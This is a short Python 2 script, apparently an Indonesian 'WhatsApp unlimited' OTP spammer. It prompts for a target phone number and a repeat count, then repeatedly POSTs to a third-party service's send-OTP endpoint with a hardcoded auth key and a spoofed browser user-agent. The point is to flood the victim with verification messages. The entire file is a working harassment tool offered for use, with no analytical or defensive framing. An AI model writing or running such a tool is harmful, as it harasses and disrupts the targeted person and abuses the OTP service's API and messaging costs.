import requests, os, sys, json
hi = '\033[0;32m'
pu = '\033[0;37m'
me = '\033[0;31m'
ku = '\033[0;33m'
try:
 os.system("clear")
 print """%s
 __        __    _   _       _ ___     _______ 
 \ \      / /_ _| | | |_ __ | (_) \   / /___ /  %sAuthor by abilseno11%s 
  \ \ /\ / / _` | | | | '_ \| | |\ \ / /  |_ \  %sGithub github.com/AbilSeno%s
   \ V  V / (_| | |_| | | | | | | \ V /  ___) | %sTeam anoncybfakeplayer%s
    \_/\_/ \__,_|\___/|_| |_|_|_|  \_/  |____/  %sWa Unlimited v3
                                               """%(hi,pu,hi,pu,hi,pu,hi,hi)
 no = raw_input("%s[%s?%s] %sMasukkan nomor target (ex:881xx) : "%(pu,ku,pu,pu))
 jum = int(raw_input("%s[%s?%s] %sMasukkan jumlah spam : "%(pu,ku,pu,pu)))
 ee = 1
 for sop in range(jum):
   dat=json.dumps({"number":"+62"+no,"auth_key":"B33FR33OTP"})
   tes = requests.post("https://api.klikwa.net/v1/number/sendotp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=dat)
   if json.loads(tes.text)["message"] == 'OTP Sent':
    print "%s[%s%s%s] %sSukses, spam to %s%s"%(pu,ku,ee,pu,pu,ku,no)
    ee += 1
   else:
    print "%s[%s%s%s] %sGagal, spam to %s%s"%(pu,ku,ee,pu,pu,ku,no)
    ee += 1
except KeyboardInterrupt: print "%s[%s!%s] %sExit"%(pu,ku,pu,pu)
except requests.exceptions.ConnectionError: print "%s[%s!%s] %sConnection Error"%(pu,ku,pu,me)
